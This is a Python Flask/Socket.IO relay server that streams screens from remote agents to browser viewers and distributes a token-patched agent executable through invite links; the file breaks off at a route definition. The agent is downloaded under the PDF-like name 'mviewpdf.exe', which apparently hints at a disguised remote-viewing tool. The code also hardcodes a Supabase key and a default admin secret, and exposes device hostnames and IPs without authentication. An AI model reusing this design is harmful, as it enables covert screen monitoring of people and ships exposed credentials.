"""
╔══════════════════════════════════════════════════════════════════════════════╗
║       Screen Connect Relay Server  v11.0  — ENTERPRISE STABLE               ║
║                                                                              ║
║  STABILITY FIXES v11.0:                                                      ║
║  • CRITICAL: Switched async_mode from "threading" → "gevent"                ║
║    Threading mode causes lock contention on high-freq binary frames          ║
║    and crashes the server. Gevent is the ONLY correct mode for streaming.    ║
║  • CRITICAL: gevent.monkey.patch_all() moved to absolute top of file        ║
║    before ANY other import — threading-mode imports break gevent patching    ║
║  • CRITICAL: SocketIOLogHandler removed — it called sio.emit() inside a     ║
║    logging handler which caused recursive lock deadlocks under gevent        ║
║  • CRITICAL: frame_bin size guard now uses proper bytes check (not len()     ║
║    on raw socketio data which can be a memoryview or list, not bytes)        ║
║  • CRITICAL: _cleanup_agent no longer calls db_update() inside the lock     ║
║    (Supabase I/O inside gevent greenlet with a threading.Lock deadlocked)   ║
║  • FIXED: All Supabase calls offloaded to background greenlets so they       ║
║    never block the main Socket.IO dispatch loop                              ║
║  • FIXED: broadcast_device_update() deferred so agent_connect handler       ║
║    returns immediately — Supabase latency was causing connect timeouts       ║
║  • FIXED: watchdog uses gevent.sleep instead of time.sleep                  ║
║  • FIXED: self-ping loop uses gevent.sleep                                  ║
║  • FIXED: Rate-limit bucket cleanup runs in watchdog, not per-request        ║
║  • NEW: /api/stream-stats returns per-device FPS/kbps in real time           ║
║  • NEW: Frame drop counter per device (logged every 500 frames)             ║
║  • NEW: Agent heartbeat now resets last_frame_ts watchdog window            ║
║  • IMPROVED: GOP buffer maxlen raised 64→128 for smoother viewer catch-up   ║
║  • IMPROVED: ping_timeout=90 / ping_interval=25 for Render/Railway/Fly      ║
╚══════════════════════════════════════════════════════════════════════════════╝

INSTALL:
  pip install flask flask-cors flask-socketio supabase python-dotenv \
              gunicorn gevent gevent-websocket requests psutil

RENDER / RAILWAY start command  (MUST use GeventWebSocketWorker):
  gunicorn -k geventwebsocket.gunicorn.workers.GeventWebSocketWorker \
           -w 1 --timeout 300 --keep-alive 75 --bind 0.0.0.0:$PORT server:app

LOCAL dev:
  python server.py
"""

# ── gevent monkey-patch MUST be first — before ANY other import ──────────────
try:
    import gevent.monkey
    gevent.monkey.patch_all()
    _GEVENT_OK = True
except ImportError:
    _GEVENT_OK = False

import os
import re
import sys
import time
import uuid
import logging
import datetime
import threading
import collections
import secrets
import traceback
import json
import struct
from logging.handlers import RotatingFileHandler
from pathlib import Path
from functools import wraps

try:
    from dotenv import load_dotenv
    load_dotenv()
except ImportError:
    pass

from flask import Flask, request, jsonify, send_from_directory, make_response, redirect

try:
    from flask_socketio import SocketIO, emit, join_room, leave_room
    SOCKETIO_OK = True
except ImportError:
    SOCKETIO_OK = False
    print("[WARN] flask-socketio not installed — pip install flask-socketio gevent gevent-websocket")

try:
    import requests as _requests
    REQUESTS_OK = True
except ImportError:
    REQUESTS_OK = False

# ══════════════════════════════════════════════════════════════════════════════
#  Configuration
# ══════════════════════════════════════════════════════════════════════════════
SUPABASE_URL  = os.environ.get("SUPABASE_URL")  or "https://iacdzpcoftxxcoigopun.supabase.co"
SUPABASE_KEY  = os.environ.get("SUPABASE_KEY")  or "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImlhY2R6cGNvZnR4eGNvaWdvcHVuIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzY0MjA1NTUsImV4cCI6MjA5MTk5NjU1NX0.5Eo21XrLTWL3RyKmuvJPdaS-NssraDMyAxVMFy-F054"
ADMIN_KEY     = os.environ.get("ADMIN_KEY",    "mview-admin-secret")
TABLE         = os.environ.get("SB_TABLE",     "devices")
PORT          = int(os.environ.get("PORT", 5000))
VERSION       = "11.0.0"

AGENT_STORAGE_URL = os.environ.get(
    "AGENT_STORAGE_URL",
    "https://github.com/maxwelnkaranja-ops/mview/releases/download/v4.0/mviewpdf.exe"
)
AGENT_DIR  = os.environ.get("AGENT_DIR",  "bin")
AGENT_FILE = os.environ.get("AGENT_FILE", "master_agent.exe")

HEARTBEAT_TIMEOUT      = int(os.environ.get("HEARTBEAT_TIMEOUT",      "35"))
MAX_VIEWERS_PER_DEVICE = int(os.environ.get("MAX_VIEWERS_PER_DEVICE", "0"))
VIEWER_IDLE_TIMEOUT    = int(os.environ.get("VIEWER_IDLE_TIMEOUT",    "0"))
MAX_SESSION_DURATION   = int(os.environ.get("MAX_SESSION_DURATION",   "0"))
AGENT_EXCLUSIVE        = os.environ.get("AGENT_EXCLUSIVE", "true").lower() not in ("0", "false", "no")
WEBHOOK_URL            = os.environ.get("WEBHOOK_URL", "").strip()
SELF_PING_INTERVAL     = int(os.environ.get("SELF_PING_INTERVAL", "240"))
_RATE_LIMIT_RPM        = int(os.environ.get("RATE_LIMIT_RPM", "300"))

# Max frame size accepted (default 4 MB — handles 1080p JPEG easily)
MAX_FRAME_BYTES = int(os.environ.get("MAX_FRAME_BYTES", str(4 * 1024 * 1024)))

TOKEN_RE = re.compile(r"^MV-[0-9A-Fa-f]{6}-[0-9A-Fa-f]{6}-[0-9A-Fa-f]{6}$")

# ══════════════════════════════════════════════════════════════════════════════
#  Logging — file + console only; NO SocketIO handler (causes deadlocks)
# ══════════════════════════════════════════════════════════════════════════════
_LOG_FILE = os.environ.get("LOG_FILE", "server.log")
_log_fmt  = logging.Formatter(
    "%(asctime)s  %(levelname)-8s  [%(threadName)s]  %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S",
)
_handlers = []
try:
    _fh = RotatingFileHandler(_LOG_FILE, maxBytes=4 * 1024 * 1024, backupCount=5)
    _fh.setFormatter(_log_fmt)
    _handlers.append(_fh)
except Exception:
    pass
_ch = logging.StreamHandler(sys.stdout)
_ch.setFormatter(_log_fmt)
_handlers.append(_ch)

logging.basicConfig(level=logging.INFO, handlers=_handlers)
log = logging.getLogger("screenconnect")

# ══════════════════════════════════════════════════════════════════════════════
#  Crash directory
# ══════════════════════════════════════════════════════════════════════════════
_CRASH_DIR = os.environ.get("CRASH_DIR", "crashes")
os.makedirs(_CRASH_DIR, exist_ok=True)

_req_local = threading.local()

def _req_id() -> str:
    return getattr(_req_local, "id", "-")

def _report_crash(context: str, exc: Exception):
    ts   = datetime.datetime.utcnow().strftime("%Y%m%d_%H%M%S_%f")
    txt  = f"=== SERVER CRASH ===\nContext: {context}\nTime: {ts}\n\n{traceback.format_exc()}"
    path = os.path.join(_CRASH_DIR, f"crash_{ts}.txt")
    try:
        with open(path, "w") as fh:
            fh.write(txt)
        reports = sorted(os.listdir(_CRASH_DIR))
        for old in reports[:-10]:
            try:
                os.remove(os.path.join(_CRASH_DIR, old))
            except Exception:
                pass
    except Exception:
        pass
    log.error(f"CRASH in {context}: {exc}")

def _global_exc_hook(exc_type, exc_value, exc_tb):
    if issubclass(exc_type, KeyboardInterrupt):
        sys.__excepthook__(exc_type, exc_value, exc_tb)
        return
    log.critical("Unhandled exception", exc_info=(exc_type, exc_value, exc_tb))
    _report_crash("global_exc_hook", exc_value)

sys.excepthook = _global_exc_hook

# ══════════════════════════════════════════════════════════════════════════════
#  Webhook  (fire-and-forget greenlet)
# ══════════════════════════════════════════════════════════════════════════════
def utcnow() -> str:
    return datetime.datetime.utcnow().isoformat()

def _fire_webhook(event: str, payload: dict):
    if not WEBHOOK_URL or not REQUESTS_OK:
        return
    def _do():
        try:
            _requests.post(WEBHOOK_URL,
                           json={"event": event, "ts": utcnow(), **payload},
                           timeout=8,
                           headers={"User-Agent": "MViewServer/11.0"})
        except Exception:
            pass
    if _GEVENT_OK:
        import gevent
        gevent.spawn(_do)
    else:
        threading.Thread(target=_do, daemon=True).start()

# ══════════════════════════════════════════════════════════════════════════════
#  Flask + CORS + SocketIO
#  CRITICAL: async_mode MUST be "gevent" — "threading" crashes under
#  high-frequency binary frame streaming due to GIL + lock contention.
# ══════════════════════════════════════════════════════════════════════════════
app = Flask(__name__, static_folder=".", static_url_path="")

try:
    from flask_cors import CORS
    CORS(app, resources={r"/*": {"origins": "*"}},
         allow_headers=["Content-Type", "Authorization", "X-Admin-Key"],
         methods=["GET", "POST", "PUT", "PATCH", "DELETE", "OPTIONS"],
         supports_credentials=False)
except ImportError:
    pass

if SOCKETIO_OK:
    sio = SocketIO(
        app,
        cors_allowed_origins="*",
        async_mode="gevent",          # ← THE KEY FIX: must be gevent, not threading
        logger=False,
        engineio_logger=False,
        ping_timeout=90,              # raised for Render / Railway free tiers
        ping_interval=25,
        max_http_buffer_size=512 * 1024 * 1024,   # 512 MB — handles 4K frames
        allow_upgrades=True,
        transports=["websocket", "polling"],
    )
else:
    sio = None

# ══════════════════════════════════════════════════════════════════════════════
#  In-memory state   (all dicts are plain Python dicts; gevent patches locks)
# ══════════════════════════════════════════════════════════════════════════════
_devices:         dict = {}                                # device_id → dev dict
_dev_lock               = threading.Lock()

_sid_to_device:   dict = {}                                # socket sid → device_id
_sid_lock               = threading.Lock()

_viewers:         dict = collections.defaultdict(set)      # device_id → set of viewer sids
_view_lock              = threading.Lock()

_dashboard_device: dict = {}                               # viewer sid → device_id
_dash_lock              = threading.Lock()

# Enterprise session tracking
_viewer_last_activity:  dict = {}
_viewer_session_start:  dict = {}
_viewer_activity_lock        = threading.Lock()

# Advanced Monitor state
_adv_agent_sids:    dict = {}    # device_id  → agent adv-socket sid
_adv_sid_to_agent:  dict = {}    # agent sid  → device_id   (O(1) reverse)
_adv_viewer_rooms:  dict = {}    # viewer sid → device_id
_adv_viewer_lock         = threading.Lock()   # protects _adv_viewer_rooms
_adv_gop_buf:       dict = {}    # device_id  → deque(maxlen=128)
_adv_gop_lock            = threading.Lock()
_adv_cursor_latest: dict = {}    # device_id  → bytes

# Per-device frame stats  (sliding 60-s window, maxlen=600 @ 10fps)
_frame_stats:       dict = collections.defaultdict(lambda: collections.deque(maxlen=600))
_frame_stats_lock        = threading.Lock()

# Agent binary cache
_agent_cache:         bytes = None
_agent_cache_ts:      float = 0.0
_agent_cache_lock          = threading.Lock()
AGENT_CACHE_TTL            = 300          # seconds

_agent_dl_cache:    dict = {}             # token → (bytes, timestamp)
_AGENT_DL_TTL            = 600

# Supabase connection
_sb      = None
_sb_lock = threading.Lock()

# Rate-limit buckets
_rate_buckets: dict = collections.defaultdict(collections.deque)
_rate_lock          = threading.Lock()

# Audit log
_audit_log:  collections.deque = collections.deque(maxlen=1000)
_audit_lock                    = threading.Lock()

_SERVER_START = time.time()

# ══════════════════════════════════════════════════════════════════════════════
#  Supabase helpers  — all heavy calls run in gevent greenlets so they
#  never block the Socket.IO dispatch loop
# ══════════════════════════════════════════════════════════════════════════════
def get_sb():
    global _sb
    with _sb_lock:
        if _sb:
            return _sb
        try:
            from supabase import create_client
            _sb = create_client(SUPABASE_URL, SUPABASE_KEY)
            log.info("Supabase connected.")
            return _sb
        except Exception as e:
            log.warning(f"Supabase unavailable: {e}")
            return None

def _sb_reset():
    global _sb
    with _sb_lock:
        _sb = None

def _sb_retry(fn, attempts=3, delay=1.0):
    for i in range(attempts):
        try:
            return fn(), True
        except Exception as e:
            if i == attempts - 1:
                log.error(f"Supabase op failed after {attempts} attempts: {e}")
                _sb_reset()
                return None, False
            _sleep(delay * (2 ** i))
    return None, False

def _sleep(secs):
    """Gevent-aware sleep."""
    if _GEVENT_OK:
        import gevent
        gevent.sleep(secs)
    else:
        time.sleep(secs)

def _bg(fn, *args, **kwargs):
    """Run fn(*args, **kwargs) in a background greenlet (or daemon thread)."""
    if _GEVENT_OK:
        import gevent
        gevent.spawn(fn, *args, **kwargs)
    else:
        threading.Thread(target=fn, args=args, kwargs=kwargs, daemon=True).start()

def db_get(token):
    sb = get_sb()
    if not sb:
        return {"device_id": token, "status": "pending", "expires_at": None}
    result, ok = _sb_retry(lambda: sb.table(TABLE).select("*").eq("device_id", token).execute())
    if ok and result:
        rows = result.data or []
        return rows[0] if rows else None
    return {"device_id": token, "status": "pending", "expires_at": None}

def db_update(token, upd: dict):
    sb = get_sb()
    if not sb:
        return False
    result, ok = _sb_retry(lambda: sb.table(TABLE).update(upd).eq("device_id", token).execute())
    return ok

def db_upsert(token, upd: dict):
    sb = get_sb()
    if not sb:
        return False
    payload = {"device_id": token, **upd}
    result, ok = _sb_retry(lambda: sb.table(TABLE).upsert(payload, on_conflict="device_id").execute())
    if not ok:
        updated, ok2 = _sb_retry(lambda: sb.table(TABLE).update(upd).eq("device_id", token).execute())
        if ok2 and updated and updated.data:
            return True
        _, ok3 = _sb_retry(lambda: sb.table(TABLE).insert(payload).execute())
        return ok3
    return ok

def db_insert(payload: dict):
    sb = get_sb()
    if not sb:
        return payload
    result, ok = _sb_retry(lambda: sb.table(TABLE).insert(payload).execute())
    if ok and result:
        return (result.data or [payload])[0]
    # Retry without optional columns
    safe = {k: v for k, v in payload.items() if k not in ("link_mode", "redirect_url")}
    result2, ok2 = _sb_retry(lambda: sb.table(TABLE).insert(safe).execute())
    if ok2 and result2:
        return (result2.data or [safe])[0]
    return payload

def db_list_all() -> list:
    sb = get_sb()
    if not sb:
        return []
    result, ok = _sb_retry(lambda: sb.table(TABLE).select("*").order("created_at", desc=True).execute())
    if ok and result:
        return result.data or []
    return []

# ══════════════════════════════════════════════════════════════════════════════
#  Agent binary helpers
# ══════════════════════════════════════════════════════════════════════════════
def _fetch_agent_bytes():
    global _agent_cache, _agent_cache_ts
    with _agent_cache_lock:
        now = time.time()
        if _agent_cache and (now - _agent_cache_ts) < AGENT_CACHE_TTL:
            return _agent_cache
        local = Path(AGENT_DIR) / AGENT_FILE
        if local.is_file():
            _agent_cache    = local.read_bytes()
            _agent_cache_ts = now
            log.info(f"Agent loaded from disk: {local}  ({len(_agent_cache):,} bytes)")
            return _agent_cache
        if REQUESTS_OK and AGENT_STORAGE_URL:
            try:
                resp = _requests.get(AGENT_STORAGE_URL, timeout=120,
                                     allow_redirects=True,
                                     headers={"User-Agent": "MViewAgent/1.0"})
                if resp.status_code == 200 and len(resp.content) > 1_000:
                    _agent_cache    = resp.content
                    _agent_cache_ts = now
                    log.info(f"Agent downloaded: {len(_agent_cache):,} bytes")
                    return _agent_cache
                log.error(f"Agent fetch HTTP {resp.status_code}")
            except Exception as e:
                log.warning(f"Agent fetch error: {e}")
        return None

def _build_patched_agent(token: str):
    raw = _fetch_agent_bytes()
    if not raw:
        return None
    MAGIC_HEAD  = b"MVTK"
    MAGIC_TAIL  = b"MVED"
    TOKEN_FIELD = 56
    tok_bytes = token.encode("utf-8")[:TOKEN_FIELD]
    padded    = tok_bytes.ljust(TOKEN_FIELD, b"\x00")
    return raw + MAGIC_HEAD + padded + MAGIC_TAIL

# ══════════════════════════════════════════════════════════════════════════════
#  Misc helpers
# ══════════════════════════════════════════════════════════════════════════════
def is_expired(s: dict) -> bool:
    exp = s.get("expires_at")
    if not exp:
        return False
    try:
        dt = datetime.datetime.fromisoformat(exp.replace("Z", "+00:00"))
        return datetime.datetime.now(datetime.timezone.utc) > dt
    except Exception:
        return False

def valid_token(t) -> bool:
    return bool(TOKEN_RE.match(t or ""))

def require_admin(f):
    @wraps(f)
    def w(*a, **k):
        if request.headers.get("X-Admin-Key", "") != ADMIN_KEY:
            log.warning(f"Unauthorised admin: path={request.path} ip={request.remote_addr}")
            return jsonify({"error": "Unauthorised"}), 401
        return f(*a, **k)
    return w

def _audit(event: str, **kw):
    entry = {"ts": utcnow(), "event": event, **kw}
    with _audit_lock:
        _audit_log.append(entry)

# ══════════════════════════════════════════════════════════════════════════════
#  Rate limiting  (sliding 60-s window per IP)
# ══════════════════════════════════════════════════════════════════════════════
def _rate_check(ip: str) -> bool:
    if _RATE_LIMIT_RPM <= 0:
        return True
    now = time.time()
    with _rate_lock:
        dq = _rate_buckets[ip]
        while dq and now - dq[0] > 60:
            dq.popleft()
        if len(dq) >= _RATE_LIMIT_RPM:
            return False
        dq.append(now)
    return True

# ══════════════════════════════════════════════════════════════════════════════
#  Flask middleware
# ══════════════════════════════════════════════════════════════════════════════
@app.before_request
def handle_preflight():
    _req_local.id = uuid.uuid4().hex[:8]
    if request.method == "OPTIONS":
        resp = make_response("", 204)
        resp.headers["Access-Control-Allow-Origin"]  = "*"
        resp.headers["Access-Control-Allow-Headers"] = "Content-Type, Authorization, X-Admin-Key"
        resp.headers["Access-Control-Allow-Methods"] = "GET, POST, PUT, PATCH, DELETE, OPTIONS"
        return resp
    if not request.path.startswith("/static"):
        ip = request.headers.get("X-Forwarded-For", request.remote_addr or "").split(",")[0].strip()
        if not _rate_check(ip):
            return jsonify({"error": "Too many requests"}), 429

@app.after_request
def add_security_headers(resp):
    resp.headers.setdefault("X-Content-Type-Options", "nosniff")
    resp.headers.setdefault("X-Frame-Options",        "SAMEORIGIN")
    resp.headers.setdefault("X-XSS-Protection",       "1; mode=block")
    resp.headers.setdefault("Referrer-Policy",         "strict-origin-when-cross-origin")
    resp.headers["X-Request-ID"] = _req_id()
    return resp

# ── Device-list cache (avoids db_list_all() on every viewer_hello) ───────────
_dev_list_cache: list = []
_dev_list_cache_ts: float = 0.0
_dev_list_cache_lock = threading.Lock()
_DEV_LIST_CACHE_TTL = 10.0   # seconds

def _refresh_dev_list_cache():
    """Refresh the device-list cache in a background greenlet."""
    global _dev_list_cache, _dev_list_cache_ts
    try:
        rows = db_list_all()
        with _dev_list_cache_lock:
            _dev_list_cache    = rows
            _dev_list_cache_ts = time.time()
    except Exception as e:
        log.error(f"_refresh_dev_list_cache error: {e}")

def _get_cached_db_rows() -> list:
    """Return cached DB rows; trigger a background refresh if stale."""
    with _dev_list_cache_lock:
        age  = time.time() - _dev_list_cache_ts
        rows = list(_dev_list_cache)
    if age > _DEV_LIST_CACHE_TTL:
        _bg(_refresh_dev_list_cache)
    return rows


def _touch_viewer(sid: str):
    with _viewer_activity_lock:
        _viewer_last_activity[sid] = time.monotonic()

def _cleanup_viewer(viewer_sid: str):
    with _dash_lock:
        did = _dashboard_device.pop(viewer_sid, None)
    if did:
        with _view_lock:
            _viewers[did].discard(viewer_sid)
    with _adv_viewer_lock:
        adv_did = _adv_viewer_rooms.pop(viewer_sid, None)
    if adv_did:
        with _adv_viewer_lock:
            vcount = sum(1 for v in _adv_viewer_rooms.values() if v == adv_did)
        agent_sid  = _adv_agent_sids.get(adv_did)
        if agent_sid and sio:
            sio.emit("viewer_count", {"count": vcount}, room=agent_sid)
    with _viewer_activity_lock:
        _viewer_last_activity.pop(viewer_sid, None)
        _viewer_session_start.pop(viewer_sid, None)

def _notify_reconnecting(did: str):
    if not sio:
        return
    payload = {"device_id": did, "ts": utcnow()}
    sio.emit("stream_reconnecting", payload, room=f"view:{did}")
    sio.emit("stream_reconnecting", payload, room=f"adv_viewers_{did}")

def _cleanup_agent(agent_sid: str):
    """
    Remove agent state, notify viewers, update DB in background.
    CRITICAL: no Supabase I/O inside the gevent dispatch path — offloaded to _bg().
    """
    with _sid_lock:
        did = _sid_to_device.pop(agent_sid, None)
    if not did:
        return
    with _dev_lock:
        dev = _devices.pop(did, None)
    # Adv-socket cleanup
    if _adv_agent_sids.get(did) == agent_sid:
        _adv_agent_sids.pop(did, None)
        _adv_sid_to_agent.pop(agent_sid, None)
    # Notify viewers + flush GOP
    _notify_reconnecting(did)
    with _adv_gop_lock:
        _adv_gop_buf.pop(did, None)
    _adv_cursor_latest.pop(did, None)
    if not dev:
        return
    label = dev.get("label", did)
    log.warning(f"Agent offline: {label} ({did})")
    _audit("agent_offline", device_id=did, label=label)
    if sio:
        payload = {"device_id": did, "label": label, "ts": utcnow()}
        sio.emit("agent_offline",  payload)
        sio.emit("device_offline", payload)
    # Supabase + webhook in background — never blocks the event loop
    _bg(_cleanup_agent_bg, did, label)

def _cleanup_agent_bg(did, label):
    try:
        db_update(did, {"status": "offline", "disconnected_at": utcnow()})
    except Exception:
        pass
    _fire_webhook("agent_offline", {"device_id": did, "label": label})
    try:
        if sio:
            broadcast_device_update()
    except Exception:
        pass

def broadcast_device_update():
    if not sio:
        return
    try:
        rows = _get_cached_db_rows()   # non-blocking cache; never blocks event loop
        with _dev_lock:
            live = {d["device_id"]: d for d in _devices.values()}
        for row in rows:
            did = row.get("device_id", "")
            if did in live:
                row.update({
                    "_live":       True,
                    "cpu":         live[did].get("cpu"),
                    "ram":         live[did].get("ram"),
                    "last_beat":   live[did].get("last_beat"),
                    "frame_count": live[did].get("frame_count", 0),
                })
        sio.emit("device_update", {"rows": rows, "ts": utcnow()})
        _broadcast_device_list()
    except Exception as e:
        log.error(f"broadcast_device_update error: {e}")

def _get_device_for_viewer(sid: str):
    with _dash_lock:
        return _dashboard_device.get(sid)

# ══════════════════════════════════════════════════════════════════════════════
#  Static / config routes
# ══════════════════════════════════════════════════════════════════════════════
@app.route("/")
def serve_root():
    for f in ("index.html", "app.html"):
        if Path(f).is_file():
            return send_from_directory(".", f)
    return jsonify({"status": "ok", "version": VERSION}), 200

@app.route("/app.html")
def serve_app_html():
    return send_from_directory(".", "app.html")

@app.route("/dashboard")
@app.route("/dashboard.html")
def serve_dashboard():
    return send_from_directory(".", "dashboard.html")

@app.route("/index.html")
def serve_index():
    return send_from_directory(".", "index.html")

@app.route("/login.html")
def serve_login():
    return redirect("/", 301)

@app.route("/config.js")
def serve_config():
    if Path("config.js").is_file():
        return send_from_directory(".", "config.js", mimetype="application/javascript")
    host = request.host_url.rstrip("/")
    fwd  = request.headers.get("X-Forwarded-Proto", "")
    if fwd == "https" or request.url.startswith("https"):
        host = "https://" + host.split("://", 1)[-1]
    host = host.rstrip("/")
    js = (
        f"/* Auto-generated by server.py v{VERSION} */\n"
        f"window.SCREEN_CONNECT_SERVER_URL = '{host}';\n"
        f"window.MVIEW_SERVER_URL          = '{host}';\n"
        f"window.MVIEW_SUPABASE_URL        = '{SUPABASE_URL}';\n"
        f"window.MVIEW_SUPABASE_ANON_KEY   = '{SUPABASE_KEY}';\n"
        f"window.SC = window.SC || {{}};\n"
        f"window.SC.SERVER_URL = window.SCREEN_CONNECT_SERVER_URL;\n"
        f"window.SessionManager = window.SessionManager || {{}};\n"
        f"window.SessionManager.CONFIG = {{\n"
        f"  SERVER_URL: window.SCREEN_CONNECT_SERVER_URL,\n"
        f"  SUPABASE_URL: window.MVIEW_SUPABASE_URL,\n"
        f"  SUPABASE_ANON_KEY: window.MVIEW_SUPABASE_ANON_KEY,\n"
        f"}};\n"
    )
    resp = make_response(js, 200)
    resp.headers["Content-Type"]  = "application/javascript"
    resp.headers["Cache-Control"] = "no-cache, no-store, must-revalidate"
    return resp

@app.route("/session_manager.js")
def serve_session_manager():
    host = request.host_url.rstrip("/")
    js = f"""/* SessionManager v11 */
'use strict';
(function(){{
  const SERVER_URL=window.SCREEN_CONNECT_SERVER_URL||'{host}';
  let _pt=null,_ct=null;
  const SM={{
    CONFIG:{{SERVER_URL,SUPABASE_URL:'{SUPABASE_URL}',SUPABASE_ANON_KEY:'{SUPABASE_KEY}'}},
    currentToken:null,currentLink:null,
    reset(){{if(_pt){{clearInterval(_pt);_pt=null;}}_ct=null;SM.currentToken=null;SM.currentLink=null;
      ['device-step-3','device-step-2'].forEach(id=>{{const e=document.getElementById(id);if(e)e.style.display='none';}});
      const s1=document.getElementById('device-step-1');if(s1)s1.style.display='';
    }},
    async generateInviteLink(){{
      const label=(document.getElementById('device-name-input')||document.getElementById('device-label'))?.value?.trim()||'New Device';
      const dtype=(document.getElementById('device-type-select')||document.getElementById('device-type'))?.value||'Standard Display';
      const loc=(document.getElementById('device-location-input')||document.getElementById('device-location'))?.value?.trim()||'';
      const s1=document.getElementById('device-step-1'),s2=document.getElementById('device-step-2'),s3=document.getElementById('device-step-3');
      if(s1)s1.style.display='none';if(s2)s2.style.display='';
      try{{
        const r=await fetch(SERVER_URL+'/api/invite',{{method:'POST',headers:{{'Content-Type':'application/json'}},body:JSON.stringify({{label,device_type:dtype,location:loc}})}});
        const j=await r.json();
        _ct=j.token||j.device_id;SM.currentToken=_ct;SM.currentLink=j.agent_url||j.download_url;
        const linkEl=document.getElementById('invite-link')||document.getElementById('link-url');if(linkEl)linkEl.value=SM.currentLink;
        const qrEl=document.getElementById('invite-qr');if(qrEl)qrEl.src='https://api.qrserver.com/v1/create-qr-code/?size=140x140&data='+encodeURIComponent(SM.currentLink);
        if(s2)s2.style.display='none';if(s3)s3.style.display='';SM._poll(_ct);
      }}catch(e){{if(s2)s2.style.display='none';if(s1)s1.style.display='';SM._notify('Failed: '+e.message,'warn');}}
    }},
    async copyLink(){{try{{await navigator.clipboard.writeText(SM.currentLink||'');SM._notify('Link copied!','ok');}}catch(e){{const i=document.getElementById('invite-link')||document.getElementById('link-url');if(i){{i.select();document.execCommand('copy');}}SM._notify('Link copied!','ok');}}}},
    _poll(token){{let c=0;const tick=async()=>{{c++;try{{const r=await fetch(SERVER_URL+'/api/invite/status?token='+token);const j=await r.json();const t=document.getElementById('step3-status');if(j.status==='online'){{clearInterval(_pt);_pt=null;if(t)t.textContent='Device connected!';SM._notify('Device "'+j.label+'" online!','ok');SM.reset();if(typeof refreshDashboardFromSupabase==='function')setTimeout(refreshDashboardFromSupabase,1000);return;}}if(t)t.textContent='Waiting for agent... ('+c+')';if(c>120){{clearInterval(_pt);_pt=null;}}}}catch(e){{}}}};_pt=setInterval(tick,5000);tick();}},
    _notify(msg,type){{if(typeof showToast==='function')showToast(msg,type==='ok'?'success':type==='warn'?'error':'info');}},
  }};
  window.SessionManager=SM;
}})();
"""
    return js, 200, {"Content-Type": "application/javascript"}

# ══════════════════════════════════════════════════════════════════════════════
#  Health / Stats / API routes
# ══════════════════════════════════════════════════════════════════════════════
@app.route("/status")
@app.route("/health")
@app.route("/api/server-info")
def health():
    with _dev_lock:
        online = len(_devices)
    crash_count = len(os.listdir(_CRASH_DIR)) if os.path.isdir(_CRASH_DIR) else 0
    try:
        import psutil
        mem = psutil.Process().memory_info().rss // (1024 * 1024)
    except Exception:
        mem = None
    return jsonify({
        "status":         "ok",
        "version":        VERSION,
        "server_time":    utcnow(),
        "uptime_seconds": int(time.time() - _SERVER_START),
        "database":       get_sb() is not None,
        "socketio":       SOCKETIO_OK,
        "async_mode":     "gevent",
        "devices_online": online,
        "agent_storage":  AGENT_STORAGE_URL,
        "agent_local":    (Path(AGENT_DIR) / AGENT_FILE).is_file(),
        "render_port":    PORT,
        "memory_mb":      mem,
        "crash_reports":  crash_count,
    })

@app.route("/api/crash", methods=["POST"])
def api_crash_report():
    data = request.get_json(silent=True) or {}
    ts   = datetime.datetime.utcnow().strftime("%Y%m%d_%H%M%S_%f")
    did  = data.get("device_id", "unknown")[:64]
    path = os.path.join(_CRASH_DIR, f"agent_{did}_{ts}.txt")
    try:
        with open(path, "w") as fh:
            fh.write(json.dumps(data, indent=2))
    except Exception:
        pass
    log.error(f"AGENT CRASH [{did}]: {data.get('context','?')} — {data.get('error','?')}")
    return jsonify({"status": "received"}), 200

@app.route("/api/audit-log")
@require_admin
def api_audit_log():
    with _audit_lock:
        rows = list(_audit_log)
    return jsonify({"entries": rows[-200:], "total": len(rows)})

@app.route("/api/agent-info")
def api_agent_info():
    local = Path(AGENT_DIR) / AGENT_FILE
    return jsonify({
        "storage_url":  AGENT_STORAGE_URL,
        "local_exists": local.is_file(),
        "local_size":   local.stat().st_size if local.is_file() else 0,
        "cache_size":   len(_agent_cache) if _agent_cache else 0,
    })

@app.route("/api/server-stats")
@require_admin
def api_server_stats():
    with _dev_lock:
        dev_count = len(_devices)
    with _view_lock:
        viewer_count = sum(len(v) for v in _viewers.values())
    try:
        import psutil
        proc    = psutil.Process()
        mem_rss = proc.memory_info().rss // (1024 * 1024)
        cpu_pct = proc.cpu_percent(interval=0.1)
    except Exception:
        mem_rss = cpu_pct = None
    return jsonify({
        "version":             VERSION,
        "uptime_seconds":      int(time.time() - _SERVER_START),
        "devices_online":      dev_count,
        "viewers_active":      viewer_count,
        "adv_agent_sids":      len(_adv_agent_sids),
        "adv_viewer_rooms":    len(_adv_viewer_rooms),
        "gop_buffer_devices":  len(_adv_gop_buf),
        "threads":             threading.active_count(),
        "memory_mb":           mem_rss,
        "cpu_pct":             cpu_pct,
        "crash_reports":       len(os.listdir(_CRASH_DIR)) if os.path.isdir(_CRASH_DIR) else 0,
        "async_mode":          "gevent",
        "gevent_patched":      _GEVENT_OK,
        "ts":                  utcnow(),
    })

@app.route("/metrics")
def api_metrics():
    with _dev_lock:
        devs = list(_devices.values())
    with _view_lock:
        tv = sum(len(v) for v in _viewers.values())
    return jsonify({
        "status": "ok", "version": VERSION,
        "devices_online": len(devs), "viewers": tv,
        "devices": [{
            "id": d.get("device_id"), "device_id": d.get("device_id"),
            "label": d.get("label"), "hostname": d.get("hostname"),
            "os": d.get("os"), "local_ip": d.get("local_ip"),
            "cpu": d.get("cpu"), "ram": d.get("ram"), "status": "online",
        } for d in devs],
        "ts": utcnow(),
    })

@app.route("/api/stream-stats")
def api_stream_stats():
    stats = {}
    with _dev_lock:
        devs = dict(_devices)
    with _view_lock:
        views = {k: len(v) for k, v in _viewers.items()}
    adv_views: dict = {}
    for vsid, did in list(_adv_viewer_rooms.items()):
        adv_views[did] = adv_views.get(did, 0) + 1
    with _frame_stats_lock:
        for did, dq in _frame_stats.items():
            if not dq:
                continue
            now    = time.time()
            recent = [(t, b) for t, b in dq if now - t < 5.0]
            fps    = len(recent) / 5.0 if recent else 0
            bps    = sum(b for _, b in recent) / 5.0 if recent else 0
            stats[did] = {
                "fps":          round(fps, 1),
                "kbps":         round(bps / 1024, 1),
                "viewers":      max(views.get(did, 0), adv_views.get(did, 0)),
                "total_frames": devs.get(did, {}).get("frame_count", 0),
                "last_frame":   devs.get(did, {}).get("last_frame_ts", ""),
            }
    return jsonify({"stream_stats": stats, "ts": utcnow()})

@app.route("/api/devices")
